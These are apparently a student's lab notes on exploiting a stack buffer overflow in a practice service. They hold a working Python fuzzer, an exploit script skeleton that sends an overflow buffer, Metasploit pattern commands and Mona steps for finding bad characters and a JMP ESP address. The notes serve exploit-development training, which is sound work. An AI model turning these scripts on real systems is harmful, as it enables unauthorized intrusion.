Notes on Buffer Overflows

### Basic Notes 
Need to run Immunity Debugger as Admin.
Make sure it's running.

## Steps to Conduct a Buffer Overflow
1. Spiking
2. Fuzzing
3. Finding the Offset
4. Overwriting the EIP
5. Finding Bad Characters
6. Finding the Right Module
7. Generating Shellcode


## Configure Mona
#### Set up working folder
```
!mona config -set workingfolder c:\mona\%p
```
### Python Fuzzer Script

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "Target IP Address"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
  ```
  
##### Purpose of the Script
The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. We need to write down how many bytes it sends and add 400 to help with with the exploit.

##### After we know the value from the fuzzer, we can use Metasploit to create a cyclic pattern that we need for our exploit.
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (The number of bytes from the Fuzzer.py script + 400) 
```

##### Purpose of the Script
The exploit script is used to crash the service and help find the EIP Offset.
  ### Python Exploit Script
  
```python 
import socket

ip = "10.10.165.171"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
When we have the payload from the patter_create.rb script, we copy that into the payload variable and run the exploit script again. We then need to use Mona to help finish finding the EIP Offset.
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {The number of bytes from the Fuzzer.py script + 400} -q {EIP Register}
```

###
We need to update the exploit script.
```python
offset = (needs to be the EIP value we just found from the last step)
retn = "BBBB"
```

### Finding Bad Chars

Create Working Directory for Mona
```
!mona config -set workingfolder c:\mona
```

The following Mona command will generate a bytearray and exclude the null byte (\x00) by default. * Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).
```
!mona bytearray -b "\x00"
```

##### Purpose of the Script
The following python script can be used to generate a string of bad chars from \x01 to \xff:
### Python Bad Chars Script

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```
Once we run this, we use the output and update the exploit.py script payload variable with this output. Then run the exploit.py script again and start removing bad characters. We do this using Mona
```
!mona compare -f C:\mona\oscp\bytearray.bin -a (ESP Address)
```
##### Mona Modules to find vuln path
```
!mona modules
```

##### Using Mona Modules to find ESP JMP
```
!mona find -s "\xff\xe4" -m {vuln path}
```
Add the value in reverse (little endian) in \x format in the payload. 
Then set a break point for the JMP ESP to make sure payload hits it.
